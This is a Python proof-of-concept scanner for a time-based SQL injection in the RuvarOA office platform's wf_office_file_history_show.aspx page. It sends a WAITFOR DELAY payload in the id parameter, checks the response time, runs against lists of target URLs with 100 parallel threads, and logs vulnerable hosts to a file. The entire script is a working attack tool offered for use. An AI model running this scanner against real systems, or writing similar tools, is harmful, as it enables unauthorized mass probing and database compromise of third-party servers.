import requests, argparse, sys
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()



def banner():
    ban = """
██████╗ ██╗   ██╗██╗   ██╗ █████╗ ██████╗  ██████╗  █████╗ 
██╔══██╗██║   ██║██║   ██║██╔══██╗██╔══██╗██╔═══██╗██╔══██╗
██████╔╝██║   ██║██║   ██║███████║██████╔╝██║   ██║███████║
██╔══██╗██║   ██║╚██╗ ██╔╝██╔══██║██╔══██╗██║   ██║██╔══██║
██║  ██║╚██████╔╝ ╚████╔╝ ██║  ██║██║  ██║╚██████╔╝██║  ██║
╚═╝  ╚═╝ ╚═════╝   ╚═══╝  ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝                                                        
"""
    print(ban)


def main():
    banner()
    parser = argparse.ArgumentParser(description="RuvarOA协同办公平台 wf_office_file_history_show SQL注入")
    parser.add_argument('-u', '--url', dest='url', type=str, help='input link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='file path')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))

        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    url_payload = '/WorkFlow/wf_office_file_history_show.aspx?id=1%27WAITFOR%20DELAY%20%270:0:5%27-- '
    url = target + url_payload
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "sec-ch-ua-platform": '"Windows"',
        "sec-ch-ua": '"Google Chrome";v="115", "Chromium";v="115", "Not=A?Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "Connection": "close"
    }

    try:
        res = requests.get(url=url, headers=headers, verify=False)
        time = str(res.elapsed.total_seconds())[0]
        if res.status_code == 200:

            if '4' < time < '6':
                print(f"[+] {target} 存在sql延时注入漏洞!")
                with open('result.txt', 'a') as f:
                    f.write(target + '\n')
            else:
                print('漏洞不存在!!')
    except Exception as e:
        print(f"[*] 该url出现错误:{target}, 错误信息：{str(e)}")


if __name__ == '__main__':
    main()